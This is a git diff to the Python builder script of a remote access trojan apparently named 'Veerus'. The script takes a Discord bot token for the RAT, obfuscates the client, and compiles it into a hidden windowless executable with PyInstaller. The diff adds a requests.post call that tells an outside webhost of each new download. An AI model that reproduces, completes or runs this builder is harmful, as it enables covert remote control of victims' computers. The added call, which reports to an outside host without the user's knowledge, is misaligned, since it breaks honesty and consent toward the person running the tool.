@@ -3,8 +3,7 @@ import base64
 import hashlib
 import os 
 import pyImpossibleObf
-from discord_webhook import DiscordWebhook, DiscordEmbed
-
+import requests
 
 key ="loooood"
 discordbottoken = input("Discord Bot Token (For The Rat) : ")
@@ -75,5 +74,16 @@ val = input("Do you use py, python or python3 filename.py to launch file? (py/py
 
 os.system(val + " hash.py")
 
+import requests
+
+
+datab = {
+  "message":"New download Of Veerus !"
+}
+r = requests.post("https://webhook667.000webhostapp.com", data=datab)
+
+print(r.text)
 os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
+
+
 
